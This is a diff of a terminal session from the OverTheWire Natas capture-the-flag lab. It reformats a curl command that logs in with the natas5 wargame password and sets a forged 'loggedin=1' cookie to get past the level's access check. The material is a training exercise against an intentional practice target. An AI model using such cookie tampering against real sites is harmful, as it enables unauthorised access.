@@ -35,8 +35,11 @@ Access disallowed. You are not logged in</div>
 </body>
 </html>
 
-┌──(amro㉿amro)-[~]
-└─$ curl -u natas5:0n35PkggAPm2zbEpOU802c0x0Msn1ToK http://natas5.natas.labs.overthewire.org --cookie "loggedin=1"
+──(amro㉿amro)-[~]
+└─$ curl -u natas5:0n35PkggAPm2zbEpOU802c0x0Msn1ToK \
+     -H "Cookie: loggedin=1" \
+     http://natas5.natas.labs.overthewire.org
+
 <html>
 <head>
 <!-- This stuff in the header has nothing to do with the level -->
